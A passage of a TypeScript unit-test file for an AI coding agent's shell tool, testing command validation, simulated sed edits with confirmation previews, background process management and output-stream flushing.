    const SKILLS_DIR_ERROR =
      'Explicitly running shell commands from within the user skills directory is not allowed. Please use absolute paths for command parameter instead.';
    const validate = (command: string) =>
      shellTool.validateToolParams({ command, is_background: false });

    it('should return an invocation for a valid command', async () => {
      expect(build('ls -l')).toBeDefined();
    });

    it.each<[string, string, Partial<ShellToolParams>, string]>([
      [
        'should throw an error for an empty command',
        ' ',
        {},
        'Command cannot be empty.',
      ],
      [
        'should throw an error for a relative directory path',
        'ls',
        { directory: 'rel/path' },
        'Directory must be an absolute path.',
      ],
      [
        'should throw an error for a directory within the user skills directory',
        'ls',
        { directory: '/test/dir/.qwen/skills/my-skill' },
        SKILLS_DIR_ERROR,
      ],
      [
        'should throw an error for the user skills directory itself',
        'ls',
        { directory: '/test/dir/.qwen/skills' },
        SKILLS_DIR_ERROR,
      ],
      [
        'should resolve directory path before checking user skills directory',
        'ls',
        { directory: '/test/dir/.qwen/skills/../skills/my-skill' },
        SKILLS_DIR_ERROR,
      ],
    ])('%s', async (_title, command, params, message) => {
      expect(() => build(command, params)).toThrow(message);
    });

    it('should mention the intentional sleep escape hatch when blocking sleep', async () => {
      expect(validate('sleep 5')).toContain('intentional-sleep:');
    });

    it('should explain rejected intentional sleep comments', async () => {
      const shortReasonError = validate('sleep 5 # intentional-sleep: wait');
      const overCapError = validate(
        'sleep 601s # intentional-sleep: wait for MCP rate limit reset',
      );

      expect(shortReasonError).toContain('reason is too short');
      expect(shortReasonError).not.toContain('add a trailing comment like');
      expect(overCapError).toContain('foreground sleeps over 10 minutes');
      expect(overCapError).not.toContain('add a trailing comment like');
    });

    it('should allow sleep with a valid intentional sleep comment', async () => {
      expect(
        validate('sleep 5 # intentional-sleep: wait for MCP rate limit reset'),
      ).toBeNull();
    });

    it('should reject broad kill commands that can terminate qwen-code', async () => {
      for (const command of [
        'taskkill /F /IM node.exe',
        'killall node',
        'pkill -f qwen-code',
      ]) {
        expect(() => build(command)).toThrow(
          'Blocked: this command may terminate the running qwen-code process',
        );
      }
    });

    it('should allow targeted process kills', async () => {
      expect(validate('taskkill /PID 1234 /F')).toBeNull();
      expect(validate('kill 1234')).toBeNull();
    });

    it('should guide model to split and use intentional-sleep for sleep chains', async () => {
      const error = validate('sleep 5 && echo ok');

      expect(error).toContain('Split into two calls');
      expect(error).toContain('intentional-sleep:');
      expect(error).toContain('reason');
    });

    it('should return an invocation for a valid absolute directory path', async () => {
      (mockConfig.getWorkspaceContext as Mock).mockReturnValue(
        createMockWorkspaceContext('/test/dir', ['/another/workspace']),
      );
      expect(build('ls', { directory: '/test/dir/subdir' })).toBeDefined();
    });

    it('should include background indicator in description when is_background is true', async () => {
      const invocation = build('npm start', { is_background: true });
      expect(invocation.getDescription()).toContain('[background]');
    });

    it('should not include background indicator in description when is_background is false', async () => {
      expect(build('npm test').getDescription()).not.toContain('[background]');
    });

    describe('is_background parameter coercion', () => {
      it.each([
        ['should accept string "true" as boolean true', 'npm run dev', 'true'],
        [
          'should accept string "false" as boolean false',
          'npm run build',
          'false',
        ],
        ['should accept string "True" as boolean true', 'npm run dev', 'True'],
        [
          'should accept string "False" as boolean false',
          'npm run build',
          'False',
        ],
      ])('%s', async (_title, command, flag) => {
        const invocation = build(command, {
          is_background: flag as unknown as boolean,
        });
        expect(invocation).toBeDefined();
        if (flag.toLowerCase() === 'true') {
          expect(invocation.getDescription()).toContain('[background]');
        } else {
          expect(invocation.getDescription()).not.toContain('[background]');
        }
      });
    });
  });

  describe('execute', () => {
    const mockAbortSignal = new AbortController().signal;

    const resolveShellExecution = (
      result: Partial<ShellExecutionResult> = {},
    ) => {
      resolveExecutionPromise(
        shellResult({
          rawOutput: Buffer.from(result.output || ''),
          output: 'Success',
          ...result,
        }),
      );
    };

    /** Settles the pending spawn with `shellResult(result)`; returns `promise`. */
    const settle = (
      promise: Promise<ToolResult>,
      result: Partial<ShellExecutionResult> = {},
    ) => {
      resolveExecutionPromise(shellResult(result));
      return promise;
    };

    // Runs `command` in the foreground (`params` extend the build), optionally
    // advancing fake time first, then settles it with `result`.
    const runFg = async (
      command: string,
      result: Partial<ShellExecutionResult> = {},
      {
        advanceMs,
        ...params
      }: Partial<ShellToolParams> & { advanceMs?: number } = {},
    ) => {
      const promise = build(command, params).execute(mockAbortSignal);
      if (advanceMs !== undefined) await vi.advanceTimersByTimeAsync(advanceMs);
      resolveShellExecution(result);
      return promise;
    };

    /** Runs `command` in the foreground to a clean exit; returns the command the service spawned. */
    const spawnedCommand = async (
      command: string,
      { waitForSpawn = false } = {},
    ) => {
      const promise = build(command).execute(mockAbortSignal);
      if (waitForSpawn) {
        await vi.waitFor(() =>
          expect(mockShellExecutionService).toHaveBeenCalled(),
        );
      }
      await settle(promise);
      return mockShellExecutionService.mock.calls[0][0] as string;
    };

    // Runs `git commit -m "x"` to exit 0 (with `output`) through the
    // attachCommitAttribution note-failure branch: HEAD moves one commit over
    // one AI-attributed file, then building the note payload throws `message`.
    const commitWithNoteFailure = async (message: string, output = '') => {
      const preSha = 'a'.repeat(40);
      const postSha = 'b'.repeat(40);
      // The note path's git probes go through childProcess.execFile.
      mockExecFile.mockImplementation(
        (
          _file: unknown,
          args: unknown,
          _options: unknown,
          callback: (
            error: Error | null,
            stdout: string,
            stderr: string,
          ) => void,
        ) => {
          const joined = (args as string[]).join(' ');
          const respond =
            joined === 'rev-parse HEAD'
              ? `${postSha}\n`
              : joined.startsWith('rev-list --count')
                ? '1\n'
                : null;
          queueMicrotask(() =>
            respond === null
              ? callback(new Error(`unexpected git call: ${joined}`), '', '')
              : callback(null, respond, ''),
          );
          return { on: vi.fn() };
        },
      );
      // The diff analysis goes through the mocked service: the commit gets
      // the deferred result, runGit probes get canned per-subcommand output.
      const probes: Array<[flag: string, output: string]> = [
        ['rev-parse --verify', `${preSha}\n`],
        ['log -1 --pretty=%P', `${preSha}\n`],
        ['rev-parse --show-toplevel', '/test/dir\n'],
        ['--name-only', 'file.txt\n'],
        ['--name-status', 'M\tfile.txt\n'],
        ['--numstat', '1\t0\tfile.txt\n'],
      ];
      mockShellExecutionService.mockImplementation((cmd: string) => {
        if (cmd.startsWith('git commit')) {
          return {
            pid: 12345,
            result: new Promise<ShellExecutionResult>((resolve) => {
              resolveExecutionPromise = resolve;
            }),
          };
        }
        const probeOutput =
          probes.find(([flag]) => cmd.includes(flag))?.[1] ?? '';
        return {
          pid: 12345,
          result: Promise.resolve(shellResult({ output: probeOutput })),
        };
      });
      // Stub the attribution singleton so the commit has one AI-touched file
      // (the mocked `crypto` breaks the real recordEdit's hashing), then make
      // the note payload build throw so the catch branch warns.
      const attributionService = CommitAttributionService.getInstance();
      vi.spyOn(attributionService, 'hasAttributions').mockReturnValue(true);
      vi.spyOn(attributionService, 'matchCommittedFiles').mockReturnValue(
        new Set(['/test/dir/file.txt']),
      );
      vi.spyOn(attributionService, 'generateNotePayload').mockImplementation(
        () => {
          throw new Error(message);
        },
      );

      const promise = build('git commit -m "x"').execute(mockAbortSignal);
      await vi.waitFor(() =>
        expect(mockShellExecutionService).toHaveBeenCalled(),
      );
      return settle(promise, { output });
    };

    /** `[title, command, expected]` table rows from a `{ title: command }` map. */
    const rowsOf = <T>(expected: T, rows: Record<string, string>) =>
      Object.entries(rows).map(([title, command]): [string, string, T] => [
        title,
        command,
        expected,
      ]);

    /** Overrides the co-author config (commit and PR attribution on). */
    const setCoAuthor = (name: string, email = 'bot@example.com') =>
      (mockConfig.getGitCoAuthor as Mock).mockReturnValue({
        commit: true,
        pr: true,
        name,
        email,
      });

    const runBg = (command: string) =>
      build(command, { is_background: true }).execute(mockAbortSignal);

    /** Starts `command` in the background, exits it with `result`, and returns its registry entry. */
    const runBgToExit = async (
      command: string,
      result: Partial<ShellExecutionResult> = {},
    ) => {
      await runBg(command);
      const entry = registeredEntry();
      resolveExecutionPromise(shellResult(result));
      // Flush the .then() microtask attached to resultPromise.
      await new Promise((r) => setImmediate(r));
      return entry;
    };

    /** Runs `command` in the foreground and settles it as promoted to the background. */
    const runPromoted = (command: string, pid: number, output = '') => {
      const promise = build(command).execute(mockAbortSignal);
      resolveShellExecution({ output, exitCode: null, promoted: true, pid });
      return promise;
    };

    /** Stubs process.kill (as `true`) until this test finishes. */
    const spyKill = () => {
      const spy = vi.spyOn(process, 'kill').mockImplementation(() => true);
      onTestFinished(() => {
        spy.mockRestore();
      });
      return spy;
    };

    // Installs a write stream for the next open; `finish` fires as soon as
    // awaited (the PR-2.5 settle path waits on it before transitioning).
    const installWriteStream = (overrides: Record<string, Mock> = {}) => {
      const stream = {
        write: vi.fn(),
        end: vi.fn(),
        on: vi.fn(),
        once: vi.fn((event: string, handler: () => void) => {
          if (event === 'finish') handler();
        }),
        ...overrides,
      };
      vi.mocked(fs.createWriteStream).mockReturnValueOnce(
        stream as unknown as fs.WriteStream,
      );
      return stream;
    };

    /** The onSettle hook the foreground run handed to the service. */
    const spawnedOnSettle = () =>
      (
        mockShellExecutionService.mock.calls[0][6] as {
          postPromote: Required<PostPromote>;
        }
      ).postPromote.onSettle;

    // Makes the next spawn resolve as promoted, first handing its post-promote
    // hooks to `onSpawn`; returns a getter for those hooks.
    const mockPromotedSpawn = (
      pid: number,
      output: string,
      onSpawn: (postPromote: PostPromote | undefined) => void = () => {},
    ) => {
      let captured: PostPromote | undefined;
      mockShellExecutionService.mockImplementationOnce((...args: unknown[]) => {
        captured = (args[6] as { postPromote?: PostPromote } | undefined)
          ?.postPromote;
        onSpawn(captured);
        return {
          pid,
          result: Promise.resolve(
            shellResult({ output, exitCode: null, promoted: true, pid }),
          ),
        };
      });
      return () => captured;
    };

    describe('simulated sed edit', () => {
      const expectedSedFilePath = path.resolve('/test/dir', 'file.txt');
      const SED = "sed -i 's/foo/bar/' file.txt";
      const buildSed = (command = SED, params: Partial<ShellToolParams> = {}) =>
        build(command, { directory: '/test/dir', ...params });
      const sedMeta = () => ({
        bom: false,
        encoding: 'utf-8',
        lineEnding: 'lf',
      });
      /** A readTextFile result for the sed target. */
      const sedFile = (content = 'foo\n') => ({ content, _meta: sedMeta() });
      /** The writeTextFile call a simulated sed edit makes. */
      const sedWrite = (content: string) => ({
        path: expectedSedFilePath,
        content,
        toolWriteOrigin: 'shell_sed_edit',
        _meta: sedMeta(),
      });

      /** The confirmation details, asserted to be an edit preview. */
      const editDetails = async (
        invocation: ToolInvocation<ShellToolParams, ToolResult>,
        signal = mockAbortSignal,
      ) => {
        const details = await invocation.getConfirmationDetails(signal);
        expect(details.type).toBe('edit');
        if (details.type !== 'edit') {
          throw new Error('expected edit confirmation');
        }
        return details;
      };

      const confirmSedEdit = async (
        invocation: ToolInvocation<ShellToolParams, ToolResult>,
        signal = mockAbortSignal,
      ) =>
        (await editDetails(invocation, signal)).onConfirm(
          ToolConfirmationOutcome.ProceedOnce,
        );

      /** Answers the confirmation with `outcome` (no preview-type check). */
      const confirmWith = async (
        invocation: ToolInvocation<ShellToolParams, ToolResult>,
        outcome = ToolConfirmationOutcome.ProceedOnce,
        payload?: { newContent: string },
      ) =>
        (await invocation.getConfirmationDetails(mockAbortSignal)).onConfirm(
          outcome,
          payload,
        );

      /** Asserts no shell spawned and no backup or write happened. */
      const expectSedSkipped = () =>
        expectNotCalled(
          mockShellExecutionService,
          mockFileHistoryService.trackEdit,
          mockFileSystemService.writeTextFile,
        );

      /** Builds a sed invocation, accepts its edit preview, and executes it. */
      const applySed = async (command = SED) => {
        const invocation = buildSed(command);
        await confirmSedEdit(invocation);
        return invocation.execute(mockAbortSignal);
      };

      /** Previews `command`, starts executing it, and asserts a raw exec preview. */
      const previewExec = async (command = SED) => {
        const invocation = buildSed(command);
        const details =
          await invocation.getConfirmationDetails(mockAbortSignal);
        const resultPromise = invocation.execute(mockAbortSignal);
        expect(details.type).toBe('exec');
        return { details, resultPromise };
      };

      /** Settles a shell fallback with 'done' and asserts the model sees it. */
      const expectShellDone = async (resultPromise: Promise<ToolResult>) => {
        resolveShellExecution({ output: 'done' });
        expect((await resultPromise).llmContent).toContain('Output: done');
      };

      it('renders a qualifying sed -i command as an edit confirmation', async () => {
        mockFileSystemService.readTextFile.mockResolvedValue(sedFile());

        const details = await editDetails(buildSed());

        expect(details.filePath).toBe(expectedSedFilePath);
        expect(details.originalContent).toBe('foo\n');
        expect(details.newContent).toBe('bar\n');
        expect(details.hideModify).toBe(true);
        expect(details.fileDiff).toContain('-foo');
        expect(details.fileDiff).toContain('+bar');
      });

      it('falls back to shell execution when sed has no prepared preview', async () => {
        mockFileSystemService.readTextFile.mockResolvedValue(
          sedFile('foo foo\n'),
        );

        const resultPromise = buildSed("sed -i 's/foo/bar/g' file.txt").execute(
          mockAbortSignal,
        );

        expect(mockFileSystemService.readTextFile).not.toHaveBeenCalled();
        expect(mockFileHistoryService.trackEdit).not.toHaveBeenCalled();
        expect(mockFileSystemService.writeTextFile).not.toHaveBeenCalled();
        await vi.waitFor(() =>
          expect(mockShellExecutionService).toHaveBeenCalled(),
        );

        await expectShellDone(resultPromise);
      });

      it('applies a qualifying sed -i command without spawning a shell after preview', async () => {
        mockFileSystemService.readTextFile.mockResolvedValue(
          sedFile('foo foo\n'),
        );

        const result = await applySed("sed -i 's/foo/bar/g' file.txt");

        expect(mockShellExecutionService).not.toHaveBeenCalled();
        expect(mockDebugLogger.debug).toHaveBeenCalledWith(
          'executing simulated sed edit',
          { command: "sed -i 's/foo/bar/g' file.txt" },
        );
        expect(mockFileHistoryService.trackEdit).toHaveBeenCalledWith(
          expectedSedFilePath,
        );
        expect(mockFileSystemService.writeTextFile).toHaveBeenCalledWith(
          sedWrite('bar bar\n'),
        );
        expect(result.llmContent).toContain('sed edit applied');
      });

      it('does not write when a simulated sed edit makes no changes', async () => {
        mockFileSystemService.readTextFile.mockResolvedValue(sedFile());

        const result = await applySed("sed -i 's/bar/baz/' file.txt");

        expectSedSkipped();
        expect(result.llmContent).toContain('sed edit made no changes');
      });

      it.each([
        { code: 'ENOENT', type: ToolErrorType.FILE_NOT_FOUND },
        { code: 'EACCES', type: ToolErrorType.READ_CONTENT_FAILURE },
      ])('maps sed execute read error $code', async ({ code, type }) => {
        mockFileSystemService.readTextFile
          .mockResolvedValueOnce(sedFile())
          .mockRejectedValueOnce(Object.assign(new Error(code), { code }));

        const result = await applySed();

        expect(mockShellExecutionService).not.toHaveBeenCalled();
        expect(mockFileSystemService.writeTextFile).not.toHaveBeenCalled();
        expect(result.error?.type).toBe(type);
      });

      it.each([
        { code: 'EACCES', type: ToolErrorType.PERMISSION_DENIED },
        { code: 'ENOSPC', type: ToolErrorType.NO_SPACE_LEFT },
        { code: 'EISDIR', type: ToolErrorType.TARGET_IS_DIRECTORY },
      ])('maps sed write error $code', async ({ code, type }) => {
        mockFileSystemService.readTextFile.mockResolvedValue(sedFile());
        mockFileSystemService.writeTextFile.mockRejectedValue(
          Object.assign(new Error(code), { code }),
        );

        const result = await applySed();

        expect(mockShellExecutionService).not.toHaveBeenCalled();
        expect(result.error?.type).toBe(type);
        expect(mockDebugLogger.warn).toHaveBeenCalledWith(
          expect.stringContaining(
            'sed edit write failed after file history backup was recorded',
          ),
        );
      });

      it('continues applying a simulated sed edit when file history tracking fails', async () => {
        mockFileSystemService.readTextFile.mockResolvedValue(sedFile());
        mockFileHistoryService.trackEdit.mockRejectedValue(
          new Error('backup failed'),
        );

        const result = await applySed();

        expect(mockShellExecutionService).not.toHaveBeenCalled();
        expect(mockDebugLogger.warn).toHaveBeenCalledWith(
          expect.stringContaining('file history trackEdit failed for sed edit'),
        );
        expect(mockFileSystemService.writeTextFile).toHaveBeenCalledWith(
          sedWrite('bar\n'),
        );
        expect(result.llmContent).toContain('sed edit applied');
      });

      it('logs non-fatal sed attribution and read-cache failures', async () => {
        mockFileSystemService.readTextFile.mockResolvedValue(sedFile());
        vi.spyOn(
          CommitAttributionService.getInstance(),
          'recordEdit',
        ).mockImplementation(() => {
          throw new Error('attribution failed');
        });
        vi.mocked(fs.statSync).mockReturnValue({} as fs.Stats);
        mockFileReadCache.recordWrite.mockImplementation(() => {
          throw new Error('cache failed');
        });

        const result = await applySed();

        expect(mockShellExecutionService).not.toHaveBeenCalled();
        expect(mockFileSystemService.writeTextFile).toHaveBeenCalled();
        for (const warning of [
          'commit attribution recordEdit failed for sed edit',
          'file read cache recordWrite failed for sed edit',
        ]) {
          expect(mockDebugLogger.warn).toHaveBeenCalledWith(
            expect.stringContaining(warning),
          );
        }
        expect(result.llmContent).toContain('sed edit applied');
      });

      it('applies confirmed inline modifications to a simulated sed edit', async () => {
        mockFileSystemService.readTextFile.mockResolvedValue(sedFile());
        const recordEditSpy = vi.spyOn(
          CommitAttributionService.getInstance(),
          'recordEdit',
        );

        const invocation = buildSed();
        await confirmWith(invocation, ToolConfirmationOutcome.ProceedOnce, {
          newContent: 'baz\n',
        });
        const result = await invocation.execute(mockAbortSignal);

        expectNotCalled(mockShellExecutionService, recordEditSpy);
        expect(mockFileSystemService.writeTextFile).toHaveBeenCalledWith(
          sedWrite('baz\n'),
        );
        expect(result.llmContent).toContain('sed edit applied');
      });

      it('does not write when sed execution is cancelled after reading', async () => {
        const abortController = new AbortController();
        mockFileSystemService.readTextFile
          .mockResolvedValueOnce(sedFile())
          .mockImplementationOnce(async () => {
            abortController.abort();
            return sedFile();
          });

        const invocation = buildSed();
        await confirmSedEdit(invocation, abortController.signal);
        const result = await invocation.execute(abortController.signal);

        expectSedSkipped();
        expect(result.llmContent).toContain('Command was cancelled');
      });

      it('awaits an in-flight sed write after cancellation starts', async () => {
        const abortController = new AbortController();
        let resolveWrite!: () => void;
        mockFileSystemService.readTextFile.mockResolvedValue(sedFile());
        mockFileSystemService.writeTextFile.mockReturnValue(
          new Promise((resolve) => {
            resolveWrite = () => resolve({});
          }),
        );

        const invocation = buildSed();
        await confirmSedEdit(invocation);

        const resultPromise = invocation.execute(abortController.signal);
        await vi.waitFor(() =>
          expect(mockFileSystemService.writeTextFile).toHaveBeenCalled(),
        );

        let settled = false;
        void resultPromise.then(() => {
          settled = true;
        });
        abortController.abort();
        await Promise.resolve();

        expect(settled).toBe(false);

        resolveWrite();
        const result = await resultPromise;

        expect(result.llmContent).toContain('sed edit applied');
      });

      it('rejects simulated sed edits when the file was not read first', async () => {
        mockFileReadCache.check.mockReturnValue({ state: 'unknown' });
        mockFileSystemService.readTextFile.mockResolvedValue(sedFile());

        const invocation = buildSed();

        await expect(
          invocation.getConfirmationDetails(mockAbortSignal),
        ).rejects.toMatchObject({
          errorType: ToolErrorType.EDIT_REQUIRES_PRIOR_READ,
        });
        const result = await invocation.execute(mockAbortSignal);

        expect(result.error?.type).toBe(ToolErrorType.EDIT_REQUIRES_PRIOR_READ);
        expect(mockShellExecutionService).not.toHaveBeenCalled();
        expect(mockFileSystemService.writeTextFile).not.toHaveBeenCalled();
      });

      it('reports timeout when a prepared sed edit times out before execution', async () => {
        mockFileSystemService.readTextFile.mockResolvedValue(sedFile());

        const invocation = buildSed(SED, { timeout: 5000 });
        await confirmSedEdit(invocation);

        stubAbortSignal(fakeSignal(true, { name: 'TimeoutError' }));
        const result = await invocation.execute(mockAbortSignal);

        expectSedSkipped();
        const message =
          'Command timed out after 5000ms before it could complete.';
        const text = `${message} There was no output before it timed out.`;
        expect(result.llmContent).toBe(text);
        expect(shellResultText(result.returnDisplay)).toBe(text);
        expect(result.error).toEqual({
          message,
          type: ToolErrorType.EXECUTION_TIMEOUT,
        });
      });

      it('switches approval mode when sed edit confirmation proceeds always', async () => {
        mockFileSystemService.readTextFile.mockResolvedValue(sedFile());

        await confirmWith(buildSed(), ToolConfirmationOutcome.ProceedAlways);

        expect(mockConfig.setApprovalMode).toHaveBeenCalledWith(
          ApprovalMode.AUTO_EDIT,
        );
      });

      it.each([
        [
          'falls back to shell execution for sed backup suffixes',
          "sed -i.bak 's/foo/bar/' file.txt",
        ],
        [
          'falls back to shell execution for env-prefixed shell wrappers',
          'LC_ALL=C bash -c "sed -i \'s/foo/bar/\' file.txt"',
        ],
        [
          'falls back to shell execution for env-prefixed unwrapped sed commands',
          `bash -c "LC_ALL=C sed -i 's/foo/bar/' file.txt"`,
        ],
      ])('%s', async (_title, command) => {
        const { resultPromise } = await previewExec(command);

        expect(mockFileSystemService.readTextFile).not.toHaveBeenCalled();
        expect(mockShellExecutionService).toHaveBeenCalled();

        await expectShellDone(resultPromise);
        expect(mockFileSystemService.writeTextFile).not.toHaveBeenCalled();
      });

      it('falls back to shell execution for background sed commands', async () => {
        const result = await buildSed(SED, { is_background: true }).execute(
          mockAbortSignal,
        );

        expect(mockFileSystemService.readTextFile).not.toHaveBeenCalled();
        expect(mockFileSystemService.writeTextFile).not.toHaveBeenCalled();
        expectSpawned("sed -i 's/foo/bar/' file.txt", {
          cwd: '/test/dir',
          background: true,
        });
        expectText(result.llmContent, ['Background shell started.', 'id: bg_']);
      });

      it('falls back to shell execution when sed preview cannot read the file', async () => {
        mockFileSystemService.readTextFile.mockRejectedValue(
          new Error('not text'),
        );

        const { details, resultPromise } = await previewExec();

        if (details.type !== 'exec') {
          throw new Error('expected exec confirmation');
        }
        expect(details.warnings).toContain(
          'Sed edit preview unavailable; showing raw shell command confirmation.',
        );
        expect(mockFileSystemService.readTextFile).toHaveBeenCalledTimes(1);
        expect(mockShellExecutionService).toHaveBeenCalled();

        await expectShellDone(resultPromise);
        expect(mockFileSystemService.writeTextFile).not.toHaveBeenCalled();
      });

      it('falls back to shell execution when the sed target is a symlink', async () => {
        vi.mocked(fs.lstatSync).mockReturnValue({
          isSymbolicLink: () => true,
        } as fs.Stats);

        const { resultPromise } = await previewExec();

        expect(mockFileSystemService.readTextFile).not.toHaveBeenCalled();
        expect(mockFileSystemService.writeTextFile).not.toHaveBeenCalled();
        expect(mockShellExecutionService).toHaveBeenCalled();

        await expectShellDone(resultPromise);
      });

      it('rejects when the file changed after the sed edit confirmation', async () => {
        mockFileSystemService.readTextFile
          .mockResolvedValueOnce(sedFile())
          .mockResolvedValueOnce(sedFile('baz\n'));

        const invocation = buildSed();
        await confirmWith(invocation);
        const result = await invocation.execute(mockAbortSignal);

        expectSedSkipped();
        expect(result.error?.type).toBe(ToolErrorType.FILE_CHANGED_SINCE_READ);
      });
    });

    it('runs background commands as managed pool entries (no & / pgrep wrap)', async () => {
      const result = await runBg('npm start');

      // Spawned unwrapped (no '&', no pgrep envelope), streaming so dev-server
      // / watcher output reaches the output file as it arrives.
      expectSpawned('npm start', { cwd: '/test/dir', background: true });
      expect(registry.register).toHaveBeenCalledTimes(1);
      const entry = registeredEntry();
      expect(entry.command).toBe('npm start');
      expect(entry.cwd).toBe('/test/dir');
      expect(entry.status).toBe('running');
      expect(entry.pid).toBe(12345);
      expect(typeof entry.shellId).toBe('string');
      expect(entry.outputPath).toContain('shell-');
      // Returns immediately with id + output path; the turn isn't blocked.
      expectText(result.llmContent, [entry.shellId, entry.outputPath]);
    });

    it('settles a background entry as completed when the process exits cleanly', async () => {
      const entry = await runBgToExit('true');

      expect(registry.complete).toHaveBeenCalledWith(
        entry.shellId,
        0,
        expect.any(Number),
      );
      expectNotCalled(registry.fail, registry.cancel);
    });

    it('settles a background entry as failed when ShellExecutionService reports error', async () => {
      const entry = await runBgToExit('no-such-command', {
        exitCode: null,
        error: new Error('spawn ENOENT'),
      });

      expect(registry.fail).toHaveBeenCalledWith(
        entry.shellId,
        'spawn ENOENT',
        expect.any(Number),
      );
      expect(registry.complete).not.toHaveBeenCalled();
    });

    it('settles a background entry as failed on non-zero exit code (no error object)', async () => {
      // A clean non-zero exit (no error, no signal) was once bucketed as
      // `completed`, misreporting a failed `npm test` / `false` as success.
      const entry = await runBgToExit('false', { exitCode: 1 });

      expect(registry.fail).toHaveBeenCalledWith(
        entry.shellId,
        expect.stringContaining('exited with code 1'),
        expect.any(Number),
      );
      expect(registry.complete).not.toHaveBeenCalled();
    });

    describe('background settle waits for the output stream flush', () => {
      // `stream.end()` is async: transitioning before 'finish' shows consumers
      // (and the status sidecar) a terminal status while trailing output is
      // not yet on disk. These streams fire events only when the test says so.
      const makeDeferredStream = () => {
        const handlers = new Map<string, Array<() => void>>();
        return {
          write: vi.fn(),
          end: vi.fn(),
          on: vi.fn(),
          once: vi.fn((event: string, handler: () => void) => {
            const list = handlers.get(event) ?? [];
            list.push(handler);
            handlers.set(event, list);
          }),
          emit: (event: string) => {
            const list = handlers.get(event) ?? [];
            handlers.set(event, []);
            for (const h of list) h();
          },
        };
      };

      const startBackgroundAndExit = async (
        deferred: { end: Mock },
        { expectFlushRequested = true } = {},
      ): Promise<{ shellId: string }> => {
        vi.mocked(fs.createWriteStream).mockReturnValueOnce(
          deferred as unknown as fs.WriteStream,
        );
        const entry = await runBgToExit('true');
        if (expectFlushRequested) {
          // The stream has been asked to flush…
          expect(deferred.end).toHaveBeenCalledTimes(1);
        }
        return { shellId: entry.shellId };
      };

      const expectCompletedOnce = (shellId: string) => {
        expect(registry.complete).toHaveBeenCalledTimes(1);
        expect(registry.complete).toHaveBeenCalledWith(
          shellId,
          0,
          expect.any(Number),
        );
      };

      it('holds the registry transition until the stream finish event', async () => {
        const deferred = makeDeferredStream();
        const { shellId } = await startBackgroundAndExit(deferred);

        // …but the registry must NOT transition before the flush completes:
        // this is the truncated-log window.
        expect(registry.complete).not.toHaveBeenCalled();

        deferred.emit('finish');
        expectCompletedOnce(shellId);

        // The still-armed 'error' listener firing later must not re-transition.
        // (A second 'finish' would be vacuous: `once` drained its handler.)
        deferred.emit('error');
        expect(registry.complete).toHaveBeenCalledTimes(1);
      });

      it('still transitions when the stream errors instead of finishing', async () => {
        // A dead stream (EIO / ENOSPC racing `.end()`) must not strand the
        // entry as running: the flush is best-effort, the transition mandatory.
        const deferred = makeDeferredStream();
        const { shellId } = await startBackgroundAndExit(deferred);
        expect(registry.complete).not.toHaveBeenCalled();

        deferred.emit('error');
        expectCompletedOnce(shellId);
      });

      it('transitions after the flush timeout when the stream never settles', async () => {
        // A wedged fd (stuck mid-flush on an unresponsive filesystem) never
        // fires 'finish'/'error'; the 10s timer is the backstop. Only timer
        // functions are faked so the helper's setImmediate flush stays real.
        fakeTimers({ toFake: ['setTimeout', 'clearTimeout'] });
        const deferred = makeDeferredStream();
        const { shellId } = await startBackgroundAndExit(deferred);
        expect(registry.complete).not.toHaveBeenCalled();

        await vi.advanceTimersByTimeAsync(10_000);
        expectCompletedOnce(shellId);

        // The finish landing after the timeout must not double-fire.
        deferred.emit('finish');
        expect(registry.complete).toHaveBeenCalledTimes(1);
      });

      it('settles immediately when the stream was already destroyed by a write error', async () => {
        // autoDestroy: an earlier EIO/ENOSPC write error destroyed the stream;
        // `.end()` is a silent no-op and no event fires, so waiting would stall
        // the transition (and /tasks, sidecar readers) for the full timeout.
        const deferred = { ...makeDeferredStream(), destroyed: true };
        const { shellId } = await startBackgroundAndExit(deferred, {
          expectFlushRequested: false,
        });

        expectCompletedOnce(shellId);
        // The dead stream is not asked to flush at all.
        expect(deferred.end).not.toHaveBeenCalled();
      });

      it('settles immediately when the stream has already finished flushing', async () => {
        // writableFinished: every byte reached the fd and 'finish' already
        // fired. (Not writableEnded: that is already true mid-flush, the very
        // window these tests protect.)
        const deferred = { ...makeDeferredStream(), writableFinished: true };
        const { shellId } = await startBackgroundAndExit(deferred, {
          expectFlushRequested: false,
        });

        expectCompletedOnce(shellId);
        expect(deferred.end).not.toHaveBeenCalled();
      });

      it('still waits when the stream has ended but not yet finished flushing', async () => {
        // writableEnded flips on `.end()` while bytes can still sit in the
        // libuv queue; settling here is exactly the truncation window.
        const deferred = {
          ...makeDeferredStream(),
          writableEnded: true,
          writableFinished: false,
        };
        const { shellId } = await startBackgroundAndExit(deferred);

        // Mid-flush: the transition is still held…
        expect(registry.complete).not.toHaveBeenCalled();

        // …until the flush actually completes.
        deferred.emit('finish');
        expectCompletedOnce(shellId);
      });

      it('disarms the flush timer when stream.end() throws synchronously', async () => {
        // The catch path settles immediately but must also clear the armed
        // timer, or 10s later it logs a misleading flush-timeout warning.
        fakeTimers({ toFake: ['setTimeout', 'clearTimeout'] });
        const deferred = makeDeferredStream();
        deferred.end.mockImplementation(() => {
          throw new Error('EBADF: bad file descriptor, close');
        });
        const { shellId } = await startBackgroundAndExit(deferred);

        // Settled via the catch path, immediately.
        expectCompletedOnce(shellId);
        expect(mockDebugLogger.warn).toHaveBeenCalledWith(
          expect.stringContaining('closing output stream on settle threw'),
        );

        // The timer is gone: advancing past the timeout fires and logs nothing.
        await vi.advanceTimersByTimeAsync(10_000);
        expect(registry.complete).toHaveBeenCalledTimes(1);
        expect(mockDebugLogger.warn).not.toHaveBeenCalledWith(
          expect.stringContaining('flush timed out'),
        );
      });
    });

    it.each([
      [
        'rejects a bare trailing & in managed background mode',
        'node server.js &',
      ],
      [
        'rejects wrapped bash commands whose stripped payload ends with bare &',
        'bash -c "node server.js &"',
      ],
      [
        'rejects wrapped sh commands whose stripped payload ends with bare &',
        "sh -c 'npm run dev &'",
      ],
    ])('%s', async (_title, command) => {
      expect(() => build(command, { is_background: true })).toThrow(
        'Background shell commands must not end with a bare "&". Remove the trailing "&" and rely on is_background: true instead.',
      );
      expect(mockShellExecutionService).not.toHaveBeenCalled();
    });

    it('keeps pre-existing comment trimming behavior for managed background validation', async () => {
      const invocation = build('echo ok # note\nsleep 5 &', {
        is_background: true,
      });

      expect(invocation).toBeDefined();
    });

    it.each([
      [
        'preserves a trailing && (logical AND would be syntactically broken otherwise)',
        'npm run dev &&',
      ],
      ['preserves an escaped trailing \\& (literal &)', 'echo foo \\&'],
      ['preserves quoted trailing ampersands', `printf '&'`],
      [
        'preserves ampersands inside double-quoted script arguments',
        `node -e "console.log('&')"`,
      ],
      [
        'preserves ampersands inside command substitutions',
